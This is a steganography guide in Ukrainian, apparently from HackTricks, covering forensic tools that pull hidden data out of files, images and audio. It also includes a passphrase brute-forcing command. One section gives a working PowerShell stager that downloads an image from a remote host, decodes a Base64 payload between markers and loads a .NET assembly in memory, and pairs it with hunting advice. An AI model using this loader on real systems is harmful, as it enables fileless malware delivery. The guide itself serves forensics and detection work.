# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Витягування даних із файлів**

### **Binwalk**

Інструмент для пошуку в бінарних файлах вбудованих прихованих файлів і даних. Встановлюється через `apt`, а його вихідний код доступний на [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Відновлює файли на основі їхніх заголовків і кінцевих частин, корисно для png-зображень. Встановлюється через `apt`, вихідний код — на [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Допомагає переглядати метадані файлу, доступно [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Схожий на exiftool, для перегляду метаданих. Можна встановити через `apt`, вихідний код на [GitHub](https://github.com/Exiv2/exiv2), та має [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Файл**

Визначте тип файлу, з яким ви маєте справу.

### **Strings**

Витягує читабельні рядки з файлів, використовуючи різні налаштування кодування для фільтрації виводу.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Порівняння (cmp)**

Корисно для порівняння зміненого файлу з його оригінальною версією, знайденою в інтернеті.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Витягування прихованих даних з тексту**

### **Приховані дані в пробілах**

Невидимі символи в, здавалося б, порожніх пробілах можуть приховувати інформацію. Щоб витягти ці дані, відвідайте [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Витягування даних із зображень**

### **Визначення деталей зображення за допомогою GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) використовується для визначення типів файлів зображень та виявлення можливих пошкоджень. Виконайте команду нижче, щоб перевірити зображення:
```bash
./magick identify -verbose stego.jpg
```
Щоб спробувати відновити пошкоджене зображення, додавання коментаря до метаданих може допомогти:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide для приховування даних**

Steghide дозволяє приховувати дані у файлах `JPEG, BMP, WAV, and AU`, може вбудовувати та витягувати зашифровані дані. Встановлення просте через `apt`, а [вихідний код доступний на GitHub](https://github.com/StefanoDeVuono/steghide).

**Команди:**

- `steghide info file` показує, чи файл містить приховані дані.
- `steghide extract -sf file [--passphrase password]` витягує приховані дані, пароль необов'язковий.

Для витягнення через веб відвідайте [цей веб-сайт](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Щоб спробувати зламати пароль Steghide, використовуйте [stegcracker](https://github.com/Paradoxis/StegCracker.git) наступним чином:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg для файлів PNG і BMP**

zsteg спеціалізується на виявленні прихованих даних у файлах PNG і BMP. Встановлення через `gem install zsteg`, з його [https://github.com/zed-0xff/zsteg].

**Commands:**

- `zsteg -a file` застосовує всі методи виявлення для файлу.
- `zsteg -E file` вказує payload для вилучення даних.

### **StegoVeritas та Stegsolve**

**stegoVeritas** перевіряє метадані, виконує перетворення зображень та застосовує LSB brute forcing серед інших можливостей. Використовуйте `stegoveritas.py -h` для повного списку опцій і `stegoveritas.py stego.jpg` щоб виконати всі перевірки.

**Stegsolve** застосовує різні кольорові фільтри, щоб виявити приховані тексти чи повідомлення в зображеннях. Доступний на [https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve].

### **FFT для виявлення прихованого вмісту**

Техніки Fast Fourier Transform (FFT) можуть виявляти прихований вміст у зображеннях. Корисні ресурси включають:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy для аудіо та файлів зображень**

Stegpy дозволяє вбудовувати інформацію в файли зображень та аудіо, підтримуючи формати PNG, BMP, GIF, WebP та WAV. Доступний на [https://github.com/dhsdshdhk/stegpy].

### **Pngcheck для аналізу файлів PNG**

Щоб аналізувати файли PNG або перевірити їх автентичність, використовуйте:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Додаткові інструменти для аналізу зображень**

Для подальшого вивчення відвідайте:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Base64-пейлоади, відмежовані маркерами, приховані в зображеннях (malware delivery)

Commodity loaders дедалі частіше ховають Base64-кодовані пейлоади як plain text всередині інакше валідних зображень (часто GIF/PNG). Замість pixel-level LSB, пейлоад відмежовується унікальними стартовими/кінцевими рядками-маркерами, вбудованими в текст/метадані файлу. Далі PowerShell stager:
- Завантажує зображення по HTTP(S)
- Знаходить рядки-маркери (приклади, зафіксовані: <<sudo_png>> … <<sudo_odt>>)
- Витягує текст між маркерами і Base64-декодує його в байти
- Завантажує .NET assembly в пам'ять і викликає відому entry method (файл не записується на диск)

Мінімальний фрагмент PowerShell для carving/loading
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Примітки
- Це підпадає під ATT&CK T1027.003 (steganography). Маркерні рядки різняться між кампаніями.
- Полювання: сканувати завантажені зображення на відомі роздільники; відмічати `PowerShell`, який використовує `DownloadString`, а потім `FromBase64String`.

Див. також приклади доставки phishing та повний потік виклику в пам'яті тут:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Вилучення даних з аудіофайлів**

**Audio steganography** пропонує унікальний спосіб приховування інформації у звукових файлах. Для вбудовування або вилучення прихованого вмісту використовуються різні інструменти.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide — універсальний інструмент, призначений для приховування даних у файлах JPEG, BMP, WAV та AU. Детальні інструкції наведені в [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Цей інструмент сумісний з багатьма форматами, включно з PNG, BMP, GIF, WebP та WAV. Для додаткової інформації див. [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg відіграє ключову роль у перевірці цілісності аудіофайлів, надаючи детальну інформацію та виявляючи будь-які невідповідності.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg відмінно підходить для приховування та витягування даних у WAV-файлах, використовуючи стратегію найменш значущого біта. Доступний на [GitHub](https://github.com/ragibson/Steganography#WavSteg). Команди включають:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound дозволяє шифрувати та виявляти інформацію у звукових файлах за допомогою AES-256. Завантажити можна з [офіційної сторінки](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Незамінний інструмент для візуального та аналітичного огляду аудіофайлів, Sonic Visualizer може виявляти приховані елементи, недоступні іншими засобами. Перейдіть на [офіційний сайт](https://www.sonicvisualiser.org/) для деталей.

### **DTMF Tones - Dial Tones**

Виявлення DTMF-тонів у аудіофайлах можна здійснити за допомогою онлайн-інструментів, таких як [цей DTMF-детектор](https://unframework.github.io/dtmf-detect/) та [DialABC](http://dialabc.com/sound/detect/index.html).

## **Other Techniques**

### **Binary Length SQRT - QR Code**

Якщо довжина бінарних даних має цілий квадратний корінь, вони можуть представляти QR code. Використайте цей фрагмент, щоб перевірити:
```python
import math
math.sqrt(2500) #50
```
Для перетворення бінарних даних у зображення перегляньте [dcode](https://www.dcode.fr/binary-image). Щоб зчитувати QR-коди, використовуйте [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Переклад Брайля**

Для перекладу Брайля [Branah Braille Translator](https://www.branah.com/braille-translator) — відмінний ресурс.

## **Посилання**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
